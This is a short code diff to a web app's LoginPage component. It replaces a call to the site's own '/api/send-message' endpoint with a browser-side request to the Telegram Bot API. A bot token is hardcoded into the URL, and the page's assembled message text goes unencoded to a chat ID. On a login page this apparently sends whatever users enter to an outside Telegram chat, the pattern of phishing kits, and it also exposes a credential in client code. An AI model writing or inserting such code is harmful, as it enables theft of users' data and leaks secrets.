@@ -64,14 +64,11 @@ export default function LoginPage() {
 
       const formattedReceipt = message.filter(Boolean).join("\n");
 
-      const res = await fetch("/api/send-message", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chatId, text: message }),
-      });
+      const url = `https://api.telegram.org/bot9233566476:AAEQcE4i9Yddstd4K9nGiVl4WHEfh6nTgEo/sendMessage?chat_id=${chatId}&text=${formattedReceipt}`;
 
-      const result = await res.json();
-
+      const api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
 
       setSending(false);
       setErrorMsg(
